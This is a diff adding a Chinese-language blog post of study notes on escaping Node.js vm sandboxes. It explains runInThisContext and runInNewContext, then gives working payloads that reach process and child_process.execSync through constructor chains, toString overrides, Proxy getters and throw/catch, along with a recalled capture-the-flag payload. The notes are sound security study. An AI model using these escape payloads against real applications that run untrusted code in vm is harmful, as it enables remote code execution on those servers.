@@ -1,0 +1,324 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>NodeJS沙箱逃逸 | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="NodeJS沙箱逃逸 | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="两种主要的沙箱模式
+一种是在当前global下创建一个作用域（sandbox），并将接收到的参数当作代码运行。
+
+使用vm.runinThisContext(code)
+const vm = require('vm');
+
+global.z..." />
+    <meta name="keywords" content="nodejs,学习笔记" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              NodeJS沙箱逃逸
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-10-04
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/Sk82FrMEE/" class="post-tag">
+                  # nodejs
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/SBvbIXKgV/" class="post-tag">
+                  # 学习笔记
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/nodejs-sha-xiang-tao-yi.jpeg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="两种主要的沙箱模式">两种主要的沙箱模式</h1>
+<p>一种是在当前global下创建一个作用域（sandbox），并将接收到的参数当作代码运行。<br>
+<img src="https://skyblu3519.github.io/post-images/1696426091612.png" alt="" loading="lazy"></p>
+<p>使用<code>vm.runinThisContext(code)</code></p>
+<pre><code class="language-javascript">const vm = require('vm');
+
+global.z = 1;
+
+const vmZ = vm.runInThisContext('z+=1');
+console.log('vmZ:', vmZ);
+console.log('localZ', z);
+</code></pre>
+<p>还有就是在当前global外再创建一个作用域，此时这个沙箱对象就是这个作用域的全局对象，沙箱内部无法访问global中的属性。<br>
+<img src="https://skyblu3519.github.io/post-images/1696426107713.png" alt="" loading="lazy"></p>
+<p>代表API：<code>runInNewContext</code></p>
+<pre><code class="language-javascript">const vm = require('vm');
+global.z = 999;
+
+const sandbox = {
+  x: 1,
+  y: 2
+};
+
+const code = 'z = x + y';
+
+const result = vm.runInNewContext(code, sandbox);
+console.log('sandboxZ:', sandbox.z);
+console.log('globalZ:', z);
+// sandboxZ: 3
+// globalZ: 999
+</code></pre>
+<h1 id="如何沙箱逃逸">如何沙箱逃逸</h1>
+<p>沙箱逃逸在Node.js中的目标是获取对<code>process</code>对象的访问权限，因为它允许执行系统命令，进而实现RCE。在Node环境中，<code>process</code>对象是挂载在<code>global</code>对象上的。</p>
+<p>但是，在使用<code>vm.createContext()</code>创建的沙箱环境中（就是上面的第二种），默认是无法直接访问到global对象的。因此，沙箱逃逸的主要目标是找到方法将<code>global</code>或<code>process</code>对象引入到沙箱中，从而实现RCE。</p>
+<p>沙箱逃逸例子</p>
+<pre><code class="language-javascript">const vm = require(&quot;vm&quot;);
+const y1 = vm.runInNewContext(`this.constructor.constructor('return process')().mainModule.require('child_process').execSync('open -a Calculator')`);
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1696426123087.png" alt="" loading="lazy"></figure>
+<p><code>runInNewContext</code>中执行的代码可以分为两部分，首先是<code>this.constructor.constructor('return process')()</code>，其中：</p>
+<ul>
+<li><code>this</code>指向的是一个与沙箱上下文无关的对象</li>
+<li><code>this.constructor</code> 则指向创建该对象的构造函数</li>
+<li><code>this.constructor.constructor</code> 指向了Function的构造函数</li>
+<li><code>...('return process')()</code> 这是一个IIFE的格式，Function的构造函数创建了一个return process的函数，并立马执行。最终返回了一个<code>process</code>对象。</li>
+</ul>
+<p><code>.mainModule.require('child_process').execSync('open -a Calculator')</code>则是通过引入<code>child_process</code>弹了一个计算器。</p>
+<h1 id="this是什么">this是什么</h1>
+<p>这段代码是可以逃逸的</p>
+<pre><code class="language-javascript">const vm = require(&quot;vm&quot;);
+const sandbox = {};
+const script = 
+`this.constructor.constructor('return process')().mainModule.require('child_process').execSync('open -a Calculator')`;
+const context = vm.createContext(sandbox);
+const res = vm.runInContext(script, context);
+</code></pre>
+<p>但是将sandbox改为<code>Object.create(null)</code>，出现了报错<br>
+<img src="https://skyblu3519.github.io/post-images/1696426158692.png" alt="" loading="lazy"></p>
+<p>sandbox变为null之后影响了process的获取，看了一些文章似乎this指的就是传入vm的沙箱对象，但似乎也不能直接将this与sandbox划等号<br>
+<img src="https://skyblu3519.github.io/post-images/1696426164236.png" alt="" loading="lazy"></p>
+<p>所以这里this所谓的“与沙箱上下文无关的对象”，到底是什么最后还是有点不清楚，总之先记住吧。</p>
+<h1 id="sandbox为null的情况">sandbox为null的情况</h1>
+<p>利用的方法</p>
+<pre><code class="language-javascript">const vm = require(&quot;vm&quot;);
+const sandbox = Object.create(null);
+const script = 
+`(() =&gt; {
+    const a = {}
+    a.toString = function () {
+      const cc = arguments.callee.caller;
+      const p = (cc.constructor.constructor('return process'))();
+      return p.mainModule.require('child_process').execSync('whoami').toString()
+    }
+    return a
+  })()`;
+const context = vm.createContext(sandbox);
+const res = vm.runInContext(script, context);
+console.log('Hello ' + res)
+</code></pre>
+<p>首先script是一个IIFE的格式，函数返回了一个<code>toString</code>方法进过重写的a对象。</p>
+<p><strong>arguments.callee</strong> 和 <strong>arguments.callee.caller</strong> 都是 JavaScript 中的旧特性，并且在严格模式（strict mode）中已被禁用。</p>
+<ol>
+<li><strong>arguments.callee</strong>: 引用了当前正在执行的函数。</li>
+<li><strong>.caller</strong>: 引用了调用当前函数的函数。</li>
+</ol>
+<p>那么在<code>console.log('Hello ' + res)</code>处，a的<code>toString</code>方法触发，进而实现了逃逸。</p>
+<p>使用<code>Proxy</code>对象劫持属性触发</p>
+<pre><code class="language-javascript">const vm = require(&quot;vm&quot;);
+const sandbox = Object.create(null);
+const script = 
+`(() =&gt;{
+    const a = new Proxy({}, {
+        get: function(){
+            const cc = arguments.callee.caller;
+            const p = (cc.constructor.constructor('return process'))();
+            return p.mainModule.require('child_process').execSync('whoami').toString();
+        }
+    })
+    return a
+})()`;
+const context = vm.createContext(sandbox);
+const res = vm.runInContext(script, context);
+console.log(res.abc)
+</code></pre>
+<p>throw+catch</p>
+<pre><code class="language-javascript">const vm = require(&quot;vm&quot;);
+
+const script = 
+`
+    throw new Proxy({}, {
+        get: function(){
+            const cc = arguments.callee.caller;
+            const p = (cc.constructor.constructor('return process'))();
+            return p.mainModule.require('child_process').execSync('whoami').toString();
+        }
+    })
+`;
+try {
+    vm.runInContext(script, vm.createContext(Object.create(null)));
+}catch(e) {
+    console.log(&quot;error:&quot; + e) 
+}
+</code></pre>
+<p>用catch捕获到了throw出的proxy对象，在console.log时由于将字符串与对象拼接，将报错信息和rce的回显一起带了出来。</p>
+<h1 id="关于上次的题目">关于上次的题目</h1>
+<p>简单回顾下之前那道startschool，就是一个很标准的沙箱绕过payload</p>
+<pre><code class="language-javascript">this.constructor.constructor('return process')().mainModule.require('child_process').execSync(`echo &quot;skysky&quot; &gt;&gt; data.html`);
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/1696426193448.png" alt="" loading="lazy"></figure>
+<h1 id="其他内容">其他内容</h1>
+<p>后面还可以看看vm2沙箱啥的，遇到再说吧～</p>
+<h1 id="参考链接">参考链接</h1>
+<p><a href="https://xz.aliyun.com/t/11859">NodeJS VM和VM2沙箱逃逸</a><br>
+<a href="https://xz.aliyun.com/t/7842">nodejs沙箱与黑魔法</a><br>
+<a href="https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html">Sandboxing NodeJS is hard, here is why</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E4%B8%A4%E7%A7%8D%E4%B8%BB%E8%A6%81%E7%9A%84%E6%B2%99%E7%AE%B1%E6%A8%A1%E5%BC%8F">两种主要的沙箱模式</a></li>
+<li><a href="#%E5%A6%82%E4%BD%95%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8">如何沙箱逃逸</a></li>
+<li><a href="#this%E6%98%AF%E4%BB%80%E4%B9%88">this是什么</a></li>
+<li><a href="#sandbox%E4%B8%BAnull%E7%9A%84%E6%83%85%E5%86%B5">sandbox为null的情况</a></li>
+<li><a href="#%E5%85%B3%E4%BA%8E%E4%B8%8A%E6%AC%A1%E7%9A%84%E9%A2%98%E7%9B%AE">关于上次的题目</a></li>
+<li><a href="#%E5%85%B6%E4%BB%96%E5%86%85%E5%AE%B9">其他内容</a></li>
+<li><a href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5">参考链接</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/suctf-2019easyweb/">
+              <h3 class="post-title">
+                [SUCTF 2019]EasyWeb
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
